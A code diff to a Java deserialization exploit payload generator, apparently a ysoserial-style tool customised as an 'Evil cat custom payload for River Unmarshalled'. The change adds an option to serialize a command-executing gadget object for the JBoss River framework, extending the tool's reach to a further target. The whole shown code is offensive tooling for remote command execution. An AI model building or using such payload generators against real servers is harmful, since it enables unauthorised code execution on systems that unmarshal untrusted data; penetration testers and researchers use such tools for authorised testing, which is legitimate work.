@@ -16,14 +16,16 @@ public class GeneratePayload {
 	public static void main(final String[] args) {
         System.out.println("[+] Evil cat custom payload for River Unmarshalled");
 
-        if (args.length != 2) {
+        if (args.length < 2) {
 			printUsage();
 			System.exit(USAGE_CODE);
 		}
 		final String payloadType = args[0];
 		final String command = args[1];
+        final SerializationFramework serializationFramework = args.length > 2 ? SerializationFramework.valueOf( args[2]) : null;
 
-		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
+
+        final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 		if (payloadClass == null) {
 			System.err.println("Invalid payload type '" + payloadType + "'");
 			printUsage();
@@ -35,7 +37,12 @@ public class GeneratePayload {
 			final ObjectPayload payload = payloadClass.newInstance();
 			final Object object = payload.getObject(command);
 			PrintStream out = System.out;
-			Serializer.serialize(object, out);
+            if (serializationFramework  == SerializationFramework.JBOSS_RIVER) {
+                System.out.println("[..] Serializing for JBOSS River framework");
+                Serializer.serializeForRiver(object, out);
+            } else {
+                Serializer.serialize(object, out);
+            }
 			ObjectPayload.Utils.releasePayload(payload, object);
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
